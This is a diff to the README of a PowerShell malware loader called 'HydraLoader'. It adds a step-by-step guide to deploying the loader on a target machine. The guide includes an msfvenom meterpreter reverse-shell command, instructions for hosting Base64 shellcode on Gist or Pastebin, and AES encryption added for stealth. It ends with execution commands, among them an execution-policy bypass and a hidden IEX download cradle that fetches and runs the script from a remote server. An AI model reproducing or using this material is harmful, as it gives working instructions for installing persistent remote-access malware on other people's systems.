@@ -88,23 +88,108 @@ HydraLoader employs a dual-headed, self-healing persistence mechanism to ensure 
 
 ---
 
-## 🛠️ Getting Started
+## 🚀 How to Use This Beast 😏
 
-### 1. Payload Configuration
--   **URL**: Modify the Base64 encoded URL in the `$cfg` hashtable (`$cfg.o`).
--   **Payload Format**: The payload must be in raw shellcode format, which is then Base64 encoded.
+This guide will walk you through preparing your payload, configuring HydraLoader, and deploying it on a target system.
 
-### 2. AES Encryption (Optional)
-To use the AES decryption capability:
-1.  **Encrypt your payload**: Use your preferred tool to encrypt your shellcode with AES-256 (CBC mode, PKCS7 padding).
-2.  **Configure Key and IV**:
-    -   Base64 encode your 32-byte encryption key and place it in `$cfg.r`.
-    -   Base64 encode your 16-byte IV and place it in `$cfg.s`.
-3.  **Base64 encode the encrypted payload** and host it at your URL.
-4.  **Activate Decryption**: Uncomment the three lines in the payload handling section of the script to activate the decryption routine.
+### Step 1: Payload Preparation (Example with `msfvenom`)
 
-### 3. Deployment
-The script is self-contained. It can be executed via any standard PowerShell invocation method. On its first run on a target machine, it will automatically establish its persistence mechanisms.
+First, you need to generate your shellcode. For this example, we'll create a simple reverse shell payload.
+
+1.  **Generate Raw Shellcode**:
+    Use a tool like Metasploit's `msfvenom` to create the raw shellcode.
+
+    ```bash
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f raw -o shellcode.bin
+    ```
+    > Replace `YOUR_IP` and `YOUR_PORT` with your listener's details.
+
+2.  **Encode the Shellcode in Base64**:
+    HydraLoader expects the payload to be Base64 encoded.
+
+    ```powershell
+    # In PowerShell
+    $bytes = [System.IO.File]::ReadAllBytes("C:\path\to\shellcode.bin")
+    [System.Convert]::ToBase64String($bytes) | Out-File shellcode_b64.txt
+    ```
+    > Copy the resulting Base64 string. You'll need it in the next step.
+
+### Step 2: Host Your Payload
+
+1.  **Host the Base64 Payload**:
+    Paste the Base64 string you just copied into a file (e.g., `payload.txt`) and host it on a web server or a service like GitHub Gist, Pastebin, etc.
+2.  **Get the Raw URL**:
+    Make sure you have a direct, raw link to the file content. For example, a GitHub Gist raw URL looks like `https://gist.githubusercontent.com/user/gist_id/raw/payload.txt`.
+
+### Step 3: Configure HydraLoader
+
+Now, you need to configure the `MALWARE DECODED.ps1` script itself.
+
+1.  **Update the Payload URL**:
+    -   Find the `$cfg` hashtable at the beginning of the script.
+    -   Locate the key `$cfg.o`. This holds the Base64 encoded URL of your payload.
+    -   First, encode your raw payload URL in Base64:
+        ```powershell
+        [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://your-raw-payload-url.com/payload.txt"))
+        ```
+    -   Replace the existing value of `$cfg.o` with your new Base64 encoded URL.
+
+### Step 4: (Optional) Configure AES Encryption for Maximum Stealth
+
+If you want to add another layer of protection, you can encrypt your payload.
+
+1.  **Generate a Key and IV**:
+    You need a 32-byte (256-bit) key and a 16-byte (128-bit) IV. You can generate them in PowerShell:
+    ```powershell
+    # Generate a random 32-byte key
+    $key = -join ((0..31) | ForEach-Object { [char](Get-Random -Minimum 65 -Maximum 90) })
+    # Generate a random 16-byte IV
+    $iv = -join ((0..15) | ForEach-Object { [char](Get-Random -Minimum 65 -Maximum 90) })
+
+    Write-Host "Key: $key"
+    Write-Host "IV: $iv"
+    ```
+
+2.  **Encrypt the Shellcode**:
+    Use your favorite encryption script or tool (like CyberChef) with your generated Key and IV to encrypt your **raw** shellcode file (`shellcode.bin`). Then, Base64 encode the **encrypted** output.
+
+3.  **Configure HydraLoader with Keys**:
+    -   Base64 encode your Key and IV:
+        ```powershell
+        [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("YOUR_32_BYTE_KEY_HERE"))
+        [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("YOUR_16_BYTE_IV_HERE"))
+        ```
+    -   Update `$cfg.r` (key) and `$cfg.s` (IV) in the script with these new Base64 values.
+
+4.  **Activate Decryption in Script**:
+    -   In the `MALWARE DECODED.ps1` script, find the payload handling section.
+    -   Uncomment the three lines responsible for decryption:
+        ```powershell
+        # $k = [System.Text.Encoding]::UTF8.GetBytes((Get-Data $cfg.r)); $iv = [System.Text.Encoding]::UTF8.GetBytes((Get-Data $cfg.s))
+        # $exec_buf = Expand-Stream -d $buf -k $k -iv $iv; if (-not $exec_buf) { exit }
+        ```
+        And comment out the line that bypasses it:
+        ```powershell
+        # $exec_buf = $buf
+        ```
+
+### Step 5: Deployment
+
+With your payload prepared and HydraLoader configured, you're ready for deployment.
+
+1.  **Set Up Your Listener**:
+    Start your C2 listener (e.g., Metasploit's `multi/handler`) to catch the incoming connection.
+
+2.  **Execute on Target**:
+    Deliver and execute the `MALWARE DECODED.ps1` script on the target machine. You can use any standard execution method:
+    ```powershell
+    # Example: Direct execution
+    powershell.exe -ExecutionPolicy Bypass -File ".\MALWARE DECODED.ps1"
+
+    # Example: Remote download and execution (IEX cradle)
+    powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://your-server/MALWARE%20DECODED.ps1')"
+    ```
+    On its first run, HydraLoader will set up its persistence mechanisms and then proceed with the payload execution. Subsequent runs will ensure persistence is maintained before executing the payload.
 
 ---
 
